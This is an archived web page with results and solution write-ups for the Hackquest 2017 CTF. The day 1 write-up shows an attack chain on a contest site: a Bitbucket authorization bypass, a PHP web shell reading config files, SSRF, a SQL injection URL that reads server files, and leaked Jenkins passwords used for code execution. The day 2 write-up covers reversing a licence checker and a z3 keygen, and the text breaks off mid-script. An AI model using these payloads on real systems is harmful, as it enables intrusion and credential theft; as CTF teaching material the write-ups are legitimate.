<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Hackquest 2017. Results & Writeups</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Seven days and seven interesting tasks are the most comprehensive description of the annual hakquest in front of Zeronights. This year, the tasks were...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Hackquest 2017. Results & Writeups</h1><div class="post__text post__text-html js-mediator-article"><p> <a href="https://habrahabr.ru/company/dsec/blog/342224/"><img src="https://habrastorage.org/webt/rm/yv/a-/rmyva-5jaqdlglbdencvpjafjli.jpeg" alt="image"><br></a> </p><br><p>  Seven days and seven interesting tasks are the most comprehensive description of the annual hakquest in front of Zeronights.  This year, the tasks were more varied, which made the quest interesting for more participants.  After reading this article, you can familiarize yourself with the solution of all tasks, as well as find out the names of the winners. </p><a name="habracut"></a><br><hr><br><h1>  Day 1. WebPWN </h1><br><p>  The first day began with the classic Web.  The task from ONSEC consisted of exploiting vulnerabilities such as partial authorization bypass, command injection, sql injection, SSRF.  Consistently using each of them, you could get the rce and read the flag.  About 1800 people tried to solve this task. </p><br><table><tbody><tr><td colspan="3" align="center">  Winners </td></tr><tr><td align="center">  <b>1 place</b> </td><td align="center">  <b>2nd place</b> </td><td align="center">  <b>3rd place</b> </td></tr><tr><td align="center"><pre><code class="html hljs xml">blackfan</code> </pre> </td><td align="center"><pre> <code class="html hljs xml">DarkCaT</code> </pre> </td><td align="center"><pre> <code class="html hljs xml">kreon</code> </pre> </td></tr></tbody></table><br><p>  Also decided: <code>ilyaluk</code> , <code>raz0r</code> , <code>akamajoris</code> , <code>kurlikasd</code> , <code>poneev</code> , <code>shvetsovalex007</code> , <code>leon+zeronights</code> , <code>mohemiv</code> </p><br><div class="spoiler">  <b class="spoiler_title">1st day writeup.</b>  <b class="spoiler_title">(by blackfan)</b> <div class="spoiler_text"><blockquote>  Try to save a company from the ICC, and consequent loss of money. <br>  <a href="http://zeroevening.org/">http://zeroevening.org</a> </blockquote><br><h3 id="httpzeroeveningorg">  <a href="http://zeroevening.org/">http://zeroevening.org/</a> </h3><br><img src="https://habrastorage.org/getpro/habr/post_images/beb/7e1/90e/beb7e190e57a2f31c02b6f97e17d7d06.png" alt="image"><br><p>  The site with the task is an almost empty page.  From interesting - only html comment. </p><br><pre> <code class="hljs xml"><span class="hljs-comment"><span class="hljs-comment">&lt;!-- updated page via bitbucket 23.10.2017 --&gt;</span></span> http://bitbucket.zeroevening.org/</code> </pre> <br><h5>  http://bitbucket.zeroevening.org </h5><br><p>  We find a subdomain with bitbucket v4.7.1, which is vulnerable to <a href="https://bo0om.ru/just-enter-the-space-attacks">partial authorization bypass</a> . </p><br><pre> <code class="html hljs xml">http://bitbucket.zeroevening.org/admin%20/server-settings</code> </pre> <br><img src="https://habrastorage.org/getpro/habr/post_images/317/ed1/903/317ed1903cb3294e968624c206e9e1ad.png" alt="image"><br><h5>  http://git-admintools.zeroevening.org </h5><br><p>  From the settings, we learn about the <code>git-admintools.zeroevening.org</code> subdomain, on which the script is located that allows you to make <code>git clone --recursive</code> at an arbitrary URL.  Files are saved to the <code>/repos/%repo_name%/.</code> web directory <code>/repos/%repo_name%/.</code> </p><br><img src="https://habrastorage.org/getpro/habr/post_images/663/733/45b/66373345b9fb47578eebb1282391b9dc.png" alt="image"><br><p>  This task was supposed to use <code>CVE-2017-1000117</code> , but I went a simpler way and copied the project with a bunch of PayloadsAllTheThings ready-made <code>PayloadsAllTheThings</code> .  It turned out that the <code>pht</code> and <code>phtml</code> were not blocked and I immediately received a ready shell. </p><br><pre> <code class="html hljs xml">http://git-admintools.zeroevening.org/repos/PayloadsAllTheThings/Upload%20insecure%20files/PHP%20Extension/phpinfo.pht http://git-admintools.zeroevening.org/repos/PayloadsAllTheThings/Upload%20insecure%20files/PHP%20Extension/phpinfo.phtml</code> </pre> <br><img src="https://habrastorage.org/getpro/habr/post_images/d4a/8ce/8bd/d4a8ce8bde4d28b2896ffc93500da948.png" alt="image"><br><br><p>  Read the <code>config.php</code> and go to the next subdomain. </p><br><pre> <code class="html hljs xml">http://git-admintools.zeroevening.org/repos/PayloadsAllTheThings/Upload%20insecure%20files/PHP%20Extension/Shell.phtml?cmd=cat+/var/www/html/config.php</code> </pre> <br><img src="https://habrastorage.org/getpro/habr/post_images/8a5/4bd/96e/8a54bd96e2c25dc39b8f35860098413a.png" alt="image"><br><h3 id="httpdev-cyberplatform-icozeroeveningorg">  <a href="http://dev-cyberplatform-ico.zeroevening.org/">http://dev-cyberplatform-ico.zeroevening.org</a> </h3><br><pre> <code class="hljs objectivec">http:<span class="hljs-comment"><span class="hljs-comment">//dev-cyberplatform-ico.zeroevening.org/?url=ops.jpg</span></span></code> </pre> <br><p>  On this site, using the <code>url</code> parameter, you can make SSRF and reading arbitrary files, the result falls on the page as a base64 image.  I spent quite a lot of time looking for source code or configs until I came across <code>/etc/hosts</code> . </p><br><pre> <code class="html hljs xml">http://dev-cyberplatform-ico.zeroevening.org/?url=/etc/hosts</code> </pre> <br><img src="https://habrastorage.org/getpro/habr/post_images/419/129/5b8/4191295b8259d44260dcfe92a163f851.png" alt="image"><br><pre> <code class="html hljs xml">172.18.0.3 83c994f72770</code> </pre> <br><p>  We try the neighboring <code>IP</code> and find the script with <code>SQL Injection</code> . </p><br><pre> <code class="html hljs xml">http://dev-cyberplatform-ico.zeroevening.org/?url=http://172.18.0.2/user.php?username=root%27=0%2bunion%2bselect%2b1,load_file%28%27/var/www/html/install.php%27%29,3,4‚Äì%2b-</code> </pre> <br><p>  Read <code>install.php</code> and find the passwords for jenkins. </p><br><pre> <code class="hljs sql">mysql_query("<span class="hljs-keyword"><span class="hljs-keyword">INSERT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INTO</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> (login,pass,<span class="hljs-keyword"><span class="hljs-keyword">status</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">VALUES</span></span> (<span class="hljs-string"><span class="hljs-string">'root'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">MD5</span></span>(<span class="hljs-string"><span class="hljs-string">'toor'</span></span>), <span class="hljs-string"><span class="hljs-string">'admin'</span></span>);"); mysql_query("<span class="hljs-keyword"><span class="hljs-keyword">DROP</span></span> <span class="hljs-keyword"><span class="hljs-keyword">TABLE</span></span> jenkins_users<span class="hljs-string"><span class="hljs-string">"); mysql_query("</span></span><span class="hljs-keyword"><span class="hljs-keyword">CREATE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">TABLE</span></span> jenkins_users ( username <span class="hljs-built_in"><span class="hljs-built_in">TEXT</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> <span class="hljs-built_in"><span class="hljs-built_in">TEXT</span></span> );"); mysql_query("<span class="hljs-keyword"><span class="hljs-keyword">INSERT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INTO</span></span> jenkins_users (username,<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">VALUES</span></span> (<span class="hljs-string"><span class="hljs-string">'bomberman'</span></span>, <span class="hljs-string"><span class="hljs-string">'HVQ8UijXwU)'</span></span>);"); mysql_query("<span class="hljs-keyword"><span class="hljs-keyword">INSERT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INTO</span></span> jenkins_users (username,<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">VALUES</span></span> (<span class="hljs-string"><span class="hljs-string">'cyberpunkych'</span></span>, <span class="hljs-string"><span class="hljs-string">'DC8800_553535_proshe_pozvonitb_chem_y_kogo_to_zanimatb'</span></span>);"); mysql_query("<span class="hljs-keyword"><span class="hljs-keyword">INSERT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INTO</span></span> jenkins_users (username,<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">VALUES</span></span> (<span class="hljs-string"><span class="hljs-string">'bo0om'</span></span>, <span class="hljs-string"><span class="hljs-string">'Hipe4Money'</span></span>)<span class="hljs-string"><span class="hljs-string">"); mysql_query("</span></span><span class="hljs-keyword"><span class="hljs-keyword">INSERT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INTO</span></span> jenkins_users (username,<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">VALUES</span></span> (<span class="hljs-string"><span class="hljs-string">'jbfc'</span></span>, <span class="hljs-string"><span class="hljs-string">'InBieberWeTrust'</span></span>)<span class="hljs-string"><span class="hljs-string">");</span></span></code> </pre> <br><p>  We find the jenkins subdomain, log in under bomberman and get RCE. </p><br><pre> <code class="html hljs xml">http://jenkins.zeroevening.org/computer/(master)/script</code> </pre> <br><img src="https://habrastorage.org/getpro/habr/post_images/0d9/409/834/0d94098343519cdcb202b7079db729ea.png" alt="image"><br><p>  We find the flag, we pass it and ... nothing happens, because there was a typo in the flag that lay on the server.  I thought it was some kind of trolling and the task needed to pick even deeper, but, finding nothing, I went to sleep.  In the end, it was still the first and got an invite. </p></div></div><br><hr><br><h1>  Day 2. Petrovkey </h1><br><p>  The second day consisted of a big task from R0crew to reverse engineering.  It was necessary to deal with several layers of the "packaging" binary file.  The original file was a virtual machine running inside the executable file in the Go language.  In total, the file was downloaded more than 250 times. </p><br><table><tbody><tr><td colspan="2" align="center">  Winners </td></tr><tr><td align="center">  <b>1 place</b> </td><td align="center">  <b>2nd place</b> </td></tr><tr><td align="center"><pre> <code class="html hljs xml">vient</code> </pre> </td><td align="center"><pre> <code class="html hljs xml">Felis-Sapiens</code> </pre> </td></tr></tbody></table><br><div class="spoiler">  <b class="spoiler_title">2nd day writeup.</b>  <b class="spoiler_title">(by vient)</b> <div class="spoiler_text"><blockquote>  Your friend works in an antivirus company.  He worked on the test. </blockquote><p>  We are given an archive with the ELF x86_64 executable file " <code>petrovavlic</code> ".  Without thinking, we open it in IDA, and we see that it is packed with UPX 3.94.  UPX itself cannot unpack it, the author has cut out the section names.  Some way we unpack it, for example, by restoring names, and continue. </p><br><p>  The lines from the unpacked file immediately clear that it is written in Go.  From them and learn about the author of the job. </p><br><pre> <code class="html hljs xml">00000fb0: 2800 0000 0400 0000 476f 0000 3766 6661 (.......Go..7ffa 00000fc0: 3865 6437 3736 6134 3236 3237 3165 3864 8ed776a426271e8d 00000fd0: 6664 3937 3062 3530 6330 3163 6637 3666 fd970b50c01cf76f</code> </pre> <br><pre> <code class="html hljs xml">0024e7e0: 44eb 0900 2f68 6f6d 652f 6b72 656f 6e2f D.../home/kreon/ 0024e7f0: 476f 676c 616e 6450 726f 6a65 6374 732f GoglandProjects/ 0024e800: 7461 736b 3230 302f 766d 2e67 6f00 002f task200/vm.go../ 0024e810: 686f 6d65 2f6b 7265 6f6e 2f47 6f67 6c61 home/kreon/Gogla 0024e820: 6e64 5072 6f6a 6563 7473 2f74 6173 6b32 ndProjects/task2 0024e830: 3030 2f6d 6169 6e2e 676f 0000 2f68 6f6d 00/main.go../hom ...</code> </pre> <br><p>  Binary postriplen - standard debug information is missing.  Fortunately, Go for reflection in the <code>.gopclntab</code> section saves the names of all functions, and it is easy to find ready-made scripts to restore them, for example, <a href="https://habrahabr.ru/post/325498/">this one</a> . </p><br><p>  All names are restored - we head straight to <code>main.main</code> . </p><br><blockquote>  Side note: golang uses a nonstandard calling convention.  In x86_64, only one is standard, <a href="https://msdn.microsoft.com/ru-ru/library/ms235286.aspx">fastcall</a> .  In golang, registers are not used to pass parameters, and return values ‚Äã‚Äã(there may be more than one QWORD) are put on the stack.  This causes some inconvenience when using Hex-Rays </blockquote><p>  There is approximately this: </p><br><pre> <code class="python hljs">main.__pre__start() fmt.Println(<span class="hljs-string"><span class="hljs-string">"PetrovAntivirus Activator"</span></span>) fmt.Print( <span class="hljs-string"><span class="hljs-string">"Please enter a valid email: "</span></span>) bufio._p_Reader_.ReadString(email) main.__check__email(email) fmt_Print( <span class="hljs-string"><span class="hljs-string">"Please enter an activation key: "</span></span>) bufio._p_Reader_.ReadString(key) main.__check__key(key) table = main.__gen__table(email, key) main.__check_key_e(email, key, table)</code> </pre> <br><p>  We will sort the calls in order. </p><br><p>  <strong><code>main.__pre__start()</code></strong> : signal handlers are installed and several <code>SYS_ptrace</code> system calls <code>SYS_ptrace</code> with the <code>PTRACE_TRACEME</code> parameter.  Thus, including, it becomes impossible to debug a binary.  For normal debug, you can cut out the installation of signals and system calls.  Why can't I just cut the <code>main.__pre__start()</code> call?  To obtain system call numbers, the <code>main._p_syscall__table.__get__syscall__id</code> function is used, which contains a large switch.  It looks at the current value of the system call, determines the next one and saves it.  Thus, if you do not call this function once, all its further results will be invalid. </p><br><p>  <strong><code>main.__check__email(email)</code></strong> : mail is simply checked for a normal view. </p><br><p>  <strong><code>main.__check__key(key)</code></strong> : verifies that the key has the form <code>XXXX-XXXX-XXXX-XXXX-XXXX-XXXX</code> , where <code>X</code> is <code>[0-9A-Z]</code> . </p><br><p>  <strong><code>main.__gen__table(email, key)</code></strong> : here the first difficulties begin.  The sum of 5 and 6 key blocks ( <code>ord(key[0]) + ...</code> ) is calculated, MD5 mail is also calculated, and this hash <strong>is</strong> not used <strong>in any way</strong> .  A <code>sprintf("%02X%02X", ...)</code> is done for <code>email[0:1]</code> and <code>email[4:5]</code> , then for these 4-character lines, the amounts are calculated according to the same principle.  Then the result is calculated, a pair of numbers </p><br><pre> <code class="hljs markdown">syscall<span class="hljs-emphasis"><span class="hljs-emphasis">_id_</span></span>1 = main<span class="hljs-strong"><span class="hljs-strong">__p_syscall__</span></span>table<span class="hljs-strong"><span class="hljs-strong">____get__</span></span>syscall<span class="hljs-emphasis"><span class="hljs-emphasis">_id(&amp;a1); syscall_</span></span>id<span class="hljs-emphasis"><span class="hljs-emphasis">_2 = main_</span></span><span class="hljs-emphasis"><span class="hljs-emphasis">_p_</span></span>syscall<span class="hljs-strong"><span class="hljs-strong">__table__</span></span><span class="hljs-strong"><span class="hljs-strong">__get__</span></span>syscall<span class="hljs-emphasis"><span class="hljs-emphasis">_id(&amp;a1); table[0] = Part5_</span></span>sum + 4 <span class="hljs-bullet"><span class="hljs-bullet">* syscall_id_1 *</span></span> syscall<span class="hljs-emphasis"><span class="hljs-emphasis">_id_</span></span>2 + EMAIL<span class="hljs-strong"><span class="hljs-strong">__0_1_sum; syscall_id_3 = main__</span></span>p<span class="hljs-emphasis"><span class="hljs-emphasis">_syscall_</span></span><span class="hljs-emphasis"><span class="hljs-emphasis">_table_</span></span><span class="hljs-strong"><span class="hljs-strong">___get__</span></span>syscall<span class="hljs-emphasis"><span class="hljs-emphasis">_id(&amp;a1); syscall_</span></span>id<span class="hljs-emphasis"><span class="hljs-emphasis">_4 = main_</span></span><span class="hljs-emphasis"><span class="hljs-emphasis">_p_</span></span>syscall<span class="hljs-strong"><span class="hljs-strong">__table__</span></span><span class="hljs-strong"><span class="hljs-strong">__get__</span></span>syscall<span class="hljs-emphasis"><span class="hljs-emphasis">_id(&amp;a1); table[1] = Part6_</span></span>sum&amp; + 2 <span class="hljs-bullet"><span class="hljs-bullet">* syscall_id_3 *</span></span> syscall<span class="hljs-emphasis"><span class="hljs-emphasis">_id_</span></span>4 + EMAIL<span class="hljs-emphasis"><span class="hljs-emphasis">__4_</span></span>5_sum;</code> </pre> <br><p>  Thus, in the calculation of some two numbers involved email and the last 2 blocks of the key. </p><br><p>  And here we come to the main function: <strong><code>main.__check_key_e(email, key, table)</code></strong> .  Almost the very first line goes such a call <code>github_com_Shopify_golua_NewState();</code>  .  The name speaks for itself, it is a <a href="https://github.com/Shopify/go-lua">module for the execution of Lua in Go</a> .  Thus, somewhere in the binar there is a Lua verification script hidden. </p><br><p>  Next, in the course of the function, you need to select the calls <code>github_com_Shopify_golua__p_State__Register</code> , which register external functions written on Go in the Lua virtual machine.  There are 4 such external functions: getkey - getting the key in the form of 6 blocks, getmail - getting an email, goodkey - a message of success, badkey - about failure.  After this, <code>github_com_Shopify_golua__p_State__Load(...)</code> occurs and immediately after it <code>github_com_Shopify_golua__p_State__ProtectedCall(...)</code> , that is, the verification script is launched. </p><br><p>  Where does the verification script come from?  <a href="">The go-lua source code</a> says that the first argument in <code>Load</code> <code>io.Reader</code> , from which the script is read.  <code>io.Reader</code> is an interface in which there is just one method: <code>Read</code> .  Looking for functions with <code>_Read</code> in the name, we find an interesting <code>_home_kreon_GoglandProjects_task200_eblob__p_BlobReader__Read</code> .  Its full code with minor changes: </p><br><pre> <code class="cpp hljs">__int64 __usercall _home_kreon_GoglandProjects_task200_eblob__p_BlobReader__Read@&lt;rax&gt;(_QWORD *a1, _BYTE *a2, <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> __int64 a3) { <span class="hljs-comment"><span class="hljs-comment">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND] v3 = qword_6B69F8; v4 = a1[2] - a1[4]; if ( (signed __int64)a3 &lt;= v4 ) v4 = a3; for ( i = 0LL; (signed __int64)i &lt; v4; ++i ) { v6 = a1[4]; j = v6 + *a1; if ( j &gt;= qword_6AF6A8 || (v8 = EncBlob[j], k = a1[1] + v6, k &gt;= qword_6AF6A8) || (v10 = EncBlob[k] ^ v8, i &gt;= a3) ) runtime_panicindex(a2, a3, a1); a2[i] = v10; ++a1[4]; } if ( a1[4] &gt;= a1[2] ) result = v3; else result = 0LL; return result; }</span></span></code> </pre> <br><p>  It can be seen that <code>a[0]</code> and <code>a[1]</code> are some offsets in <code>EncBlob</code> , in which there are 2 arrays.  In the loop, successive elements from these arrays are taken and are being copied.  It is logical to assume that the script is hidden in this array. </p><br><p>  To search for a script, you can loop through all possible offsets, use a couple of numbers from these addresses, and look at the result.  We already know that in the script the functions <code>goodkey</code> and <code>badkey</code> , you can search for the <code>DWORD 'good'</code> and find the necessary offsets: 23620 and 195814 (which was the third hint).  You may also notice that before calling <code>Load</code> , a <code>Reader</code> object is created, in which our results <code>__gen__table</code> written to <code>[0]</code> and <code>[1]</code> .  This means that for the values ‚Äã‚Äãcalculated in <code>__gen__table</code> values ‚Äã‚Äãare known as they should be, therefore this is also a key verification. </p><br><div class="spoiler">  <b class="spoiler_title">Script source code (with a little refactoring)</b> <div class="spoiler_text"><pre> <code class="lua hljs"><span class="hljs-keyword"><span class="hljs-keyword">local</span></span> KEY = getkey() <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> MAIL = getmail() <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> keypart_sums = {} <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> M = {} <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> keypart_it = <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> MAIL_extended = <span class="hljs-string"><span class="hljs-string">""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> MAIL_ext_sums = {<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>} keypart_it = <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i=<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">4</span></span> <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> keypart_sum = <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> keypart_len = <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> c=<span class="hljs-number"><span class="hljs-number">1</span></span>,KEY[i]:<span class="hljs-built_in"><span class="hljs-built_in">len</span></span>() <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> keypart_sum = keypart_sum + KEY[i]:<span class="hljs-built_in"><span class="hljs-built_in">byte</span></span>(c) keypart_len = keypart_len +<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> keypart_len ~= <span class="hljs-number"><span class="hljs-number">4</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> badkey() <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> keypart_sums[keypart_it] = keypart_sum keypart_it = keypart_it +<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i=<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">4</span></span> <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> j=<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">4</span></span> <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> M[(i - <span class="hljs-number"><span class="hljs-number">1</span></span>) * <span class="hljs-number"><span class="hljs-number">4</span></span> + j] = (keypart_sums[i] + keypart_sums[j]) % <span class="hljs-number"><span class="hljs-number">169</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-built_in"><span class="hljs-built_in">string</span></span>.<span class="hljs-built_in"><span class="hljs-built_in">len</span></span>(MAIL_extended) &lt; <span class="hljs-number"><span class="hljs-number">64</span></span> <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> MAIL_extended = MAIL_extended .. MAIL <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> keypart_it = <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> MAIL_ = <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> c=<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">64</span></span> <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> MAIL_ext_sums[MAIL_] = MAIL_ext_sums[MAIL_] + MAIL_extended:<span class="hljs-built_in"><span class="hljs-built_in">byte</span></span>(c) MAIL_ = MAIL_ + <span class="hljs-number"><span class="hljs-number">1</span></span> keypart_it = keypart_it + <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> MAIL_ == <span class="hljs-number"><span class="hljs-number">5</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> MAIL_ = <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i=<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">4</span></span> <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> MAIL_ext_sums[i] = MAIL_ext_sums[i] % <span class="hljs-number"><span class="hljs-number">13</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> keypart_it = <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i=<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">16</span></span>,<span class="hljs-number"><span class="hljs-number">5</span></span> <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> M[i] = MAIL_ext_sums[keypart_it] keypart_it = keypart_it + <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> v________ = {} <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i=<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">4</span></span> <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> s = <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> j=<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">4</span></span> <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> s = s + M[(j - <span class="hljs-number"><span class="hljs-number">1</span></span>)*<span class="hljs-number"><span class="hljs-number">4</span></span> + i] <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> v________[s] = <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> pairs_num = <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> k,v <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-built_in"><span class="hljs-built_in">pairs</span></span>(v________) <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> pairs_num = pairs_num + <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> pairs_num == <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> goodkey() <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> badkey() <span class="hljs-keyword"><span class="hljs-keyword">end</span></span></code> </pre> </div></div><br><p>  In short, the script also considers the sums of the character codes, adds to each other in a 4x4 matrix, writes the sums of the character codes to the email, and verifies that the sums of the matrix columns are equal to each other. </p><br><p>  We have all the checks.  To generate a key with their help, you can use <a href="https://github.com/Z3Prover/z3">z3</a> .  The full script lies in <code>keygen.py</code> , in it we create a symbolic key and add all found restrictions to the solver, then <code>z3</code> selects the system solution for us. </p><br><div class="spoiler">  <b class="spoiler_title">keygen.py</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys sys.path.append(<span class="hljs-string"><span class="hljs-string">r'C:\tools\z3-4.5.0-x64-win\bin\python'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> z3 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * init(<span class="hljs-string"><span class="hljs-string">r'C:\tools\z3-4.5.0-x64-win\bin'</span></span>) mail = <span class="hljs-string"><span class="hljs-string">'zn2017@reverse4you.org'</span></span> cons = <span class="hljs-keyword"><span class="hljs-keyword">True</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">add_con</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(con)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">global</span></span> cons cons = And(cons, con) key = [[Int(<span class="hljs-string"><span class="hljs-string">'key_{}_{}'</span></span>.format(i, j)) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> j <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">4</span></span>)] <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">6</span></span>)] <span class="hljs-comment"><span class="hljs-comment"># for i in range(len(key)): # add_con((key[i][0] + key[i][1] + key[i][2]) % 5 == key[i][3] % 3) for i in range(len(key)): for j in range(len(key[i])): add_con( Or( And(key[i][j] &gt;= ord('0'), key[i][j] &lt;= ord('9')), And(key[i][j] &gt;= ord('A'), key[i][j] &lt;= ord('Z')))) keypart_sums = 